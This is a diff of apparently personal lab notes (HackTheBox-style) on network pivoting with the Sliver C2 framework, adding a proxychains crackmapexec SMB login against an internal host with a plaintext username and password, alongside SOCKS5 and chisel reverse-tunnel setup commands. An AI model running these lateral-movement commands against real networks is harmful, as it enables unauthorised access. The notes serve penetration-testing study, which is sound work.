@@ -65,7 +65,9 @@ Sliver
 # Pivoting
     sliver (http-beacon) > socks5 start -P 1080
     netstat -ano | grep 1080
+    proxychains crackmapexec smb 172.16.1.12 -u svc_sql -p 'jkhnrjk123!'
     
+    **********************************************************
     mxdelta@htb[/htb]$ git clone https://github.com/MrAle98/chisel
     sliver (http-beacon) > chisel
     mxdelta@htb[/htb]$ chisel server --reverse -p 1337 -v --socks5
